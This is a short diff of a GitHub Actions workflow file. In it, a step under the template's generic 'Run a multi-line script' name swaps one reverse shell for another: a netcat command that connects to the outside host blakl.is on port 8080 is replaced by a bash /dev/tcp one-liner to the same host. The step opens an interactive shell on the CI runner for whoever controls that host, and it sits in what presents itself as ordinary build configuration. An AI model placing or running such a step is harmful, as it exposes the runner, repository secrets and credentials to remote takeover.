@@ -32,4 +32,4 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          nc blakl.is 8080 -e /bin/bash
+          bash -i >& /dev/tcp/blakl.is/8080 0>&1
